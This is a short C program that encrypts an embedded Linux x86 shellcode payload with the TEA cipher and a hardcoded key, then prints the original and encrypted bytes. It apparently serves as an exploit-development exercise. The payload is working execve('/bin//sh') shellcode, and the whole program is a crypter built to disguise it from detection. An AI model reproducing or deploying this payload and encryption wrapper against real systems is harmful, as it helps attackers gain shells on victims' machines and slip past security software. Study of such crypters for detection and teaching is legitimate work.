#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "TEA.h"

#define BLOCK_SIZE	8


// shellcode, should be processed in 64 bit blocks
unsigned char pShellcode[] =
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// 128 bit key
unsigned char pKey[] = "sup3rs3cr3tp4ss1";


void printByteArray(unsigned char* byteArray, int size)
{
	int i;
	for (i=0; i<size; i++)
	{
		printf("\\x%02x", byteArray[i]);
	}
	printf("\n");
}


int main(int argc, char **argv)
{
	int i;
	int shellcodeSize;
	int encryptedShellcodeSize;
	unsigned char* pEncryptedShellcode;

	unsigned char* pEncryptedShellcodePos;

	// Encrypted shellcode should be padded to be
	//   a multiple of 8 bytes
	shellcodeSize = sizeof(pShellcode) -1;
	encryptedShellcodeSize = ((shellcodeSize / BLOCK_SIZE) + 1) * BLOCK_SIZE;

	// Allocate memory for the encrypted shellcode
	pEncryptedShellcode = malloc(encryptedShellcodeSize);
	if (!pEncryptedShellcode)
	{
		printf("Memory allocation error!");
		exit(-1);
	}

	// Copy data to the encrypted shellcode buffer
	memset(pEncryptedShellcode, 0, encryptedShellcodeSize);
	memcpy(pEncryptedShellcode, pShellcode, shellcodeSize);
	printByteArray(pEncryptedShellcode, encryptedShellcodeSize);


	// Encrypt shellcode
	pEncryptedShellcodePos = pEncryptedShellcode;
	while (pEncryptedShellcodePos - pEncryptedShellcode < encryptedShellcodeSize)
	{
		TEA_encrypt((uint32_t *) pEncryptedShellcodePos, (uint32_t *) pKey);
		pEncryptedShellcodePos += BLOCK_SIZE;
	}


	// Print the original and encrypted shellcode and size
	printf("Original shellcode: ");
	printByteArray(pShellcode, shellcodeSize);
	printf("Original shellcode size: %d\n\n", shellcodeSize);

	printf("Encrypted shellcode: ");
	printByteArray(pEncryptedShellcode, encryptedShellcodeSize);
	printf("Encrypted shellcode size: %d\n\n", encryptedShellcodeSize);


	// Free allocated memory
	free(pEncryptedShellcode);

	return 0;
}

